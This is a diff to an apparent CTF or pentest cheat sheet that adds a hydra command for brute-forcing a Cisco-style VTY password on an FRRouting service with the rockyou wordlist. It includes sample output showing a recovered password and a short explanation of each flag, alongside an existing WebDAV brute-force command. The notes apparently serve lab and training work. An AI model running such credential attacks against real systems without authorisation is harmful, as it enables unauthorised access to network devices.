@@ -49,3 +49,17 @@ hydra -L webdav-users.txt -P webdav-users.txt 10.130.148.83 http-get /webdav
 ```
 
 Used on: **bsidesgtdav** - found default-style WebDAV credentials reused for upload access.
+
+### Cisco-style VTY single-password brute force (FRRouting)
+
+```bash
+hydra -P /usr/share/wordlists/rockyou.txt $TARGET cisco -s 2623 -t 64 -f
+# [2623][cisco] host: $TARGET   password: arista
+```
+
+Used on: **OperationTakeover** - recovered the FRRouting VTY password that granted access to `configure terminal` and the file-read primitive.
+
+- `cisco` — module for Cisco-style single-password (no username) auth
+- `-s 2623` — non-default VTY port (FRR default; IOS default is `23`)
+- `-t 64` — 64 parallel threads; safe for a single-connection service
+- `-f` — stop after the first valid credential
